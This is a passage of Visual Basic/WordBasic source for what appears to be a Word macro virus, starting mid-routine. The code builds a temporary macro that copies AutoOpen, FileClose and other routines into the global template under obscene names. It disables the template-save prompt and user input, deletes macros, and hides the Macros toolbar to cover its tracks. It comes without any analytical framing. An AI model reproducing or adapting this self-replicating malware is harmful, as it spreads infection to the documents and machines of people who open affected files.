   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + " End If"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "Else"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + ses$ + " dlg"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + "End If"
   WordBasic.InsertPara
   WordBasic.Insert "errh:"
   WordBasic.InsertPara
   WordBasic.Insert "ScreenRefresh"
   WordBasic.InsertPara
   WordBasic.DocClose 1
   WordBasic.ToolsMacro Name:="r", Edit:=1, Show:=1
   WordBasic.Insert "disableinput"
   WordBasic.InsertPara
   WordBasic.Insert "on error goto errhand"
   WordBasic.InsertPara
   WordBasic.Insert tsm1$ + "Options" + se1$ + " ." + glob$ + "DotPrompt = 0"
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + "f" + Chr(34) + "," + Chr(34) + "AutoExec" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + "s" + Chr(34) + "," + Chr(34) + se$ + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + "t" + Chr(34) + "," + Chr(34) + ses$ + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + vir$ + ":autoopen" + Chr(34) + "," + Chr(34) + "fucker" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + vir$ + ":FileClose" + Chr(34) + "," + Chr(34) + "sokker" + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + vir$ + ":" + ts$ + Chr(34) + "," + Chr(34) + ts$ + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert Chr(9) + Chr(9) + cy$ + " " + Chr(34) + vir$ + ":" + tsm$ + Chr(34) + "," + Chr(34) + tsm$ + Chr(34)
   WordBasic.InsertPara
   WordBasic.Insert "errhand:"
   WordBasic.InsertPara
   WordBasic.DocClose 1
   WordBasic.Call "r"
   winner
   WordBasic.DisableAutoMacros
   errhand:
   End Sub

   Private Sub Viewer()
   Dim numm
   Dim i
   Dim NMm$
   Dim vpos
   On Error Resume Next
   numm = WordBasic.CountMacros(0)
   For i = 1 To numm
           NMm$ = WordBasic.[MacroName$](i, 0)
           WordBasic.ToolsMacro Name:=NMm$, Show:=1, Delete:=1
   Next i
   vpos = WordBasic.Val(WordBasic.[GetSystemInfo$](31)) - 8
   If UCase(WordBasic.[GetSystemInfo$](30)) = "RUS" Then
       WordBasic.ViewToolbars Toolbar:="Ìàêðîñ", Show:=1
       WordBasic.MoveToolbar "Ìàêðîñ", 0, 8, vpos
   Else
       WordBasic.ViewToolbars Toolbar:="Macros", Show:=1
       WordBasic.MoveToolbar "Macros", 0, 8, vpos
   End If
   WordBasic.ScreenRefresh
   WordBasic.ScreenUpdating 0
   End Sub

   Private Sub winner()
   On Error Resume Next
   WordBasic.ToolsMacro Name:="r", Delete:=1, Show:=1
   WordBasic.ToolsMacro Name:="s", Delete:=1, Show:=1
   WordBasic.ToolsMacro Name:="f", Delete:=1, Show:=1
   WordBasic.ToolsMacro Name:="t", Delete:=1, Show:=1
   If UCase(WordBasic.[GetSystemInfo$](30)) = "RUS" Then
       WordBasic.ViewToolbars Toolbar:="Ìàêðîñ", Hide:=1
   Else
       WordBasic.ViewToolbars Toolbar:="Macros", Hide:=1
   End If
   End Sub

   Attribute VB_Name = "mir"

   Public Sub MAIN()
   WordBasic.DisableInput
   '
   End Sub
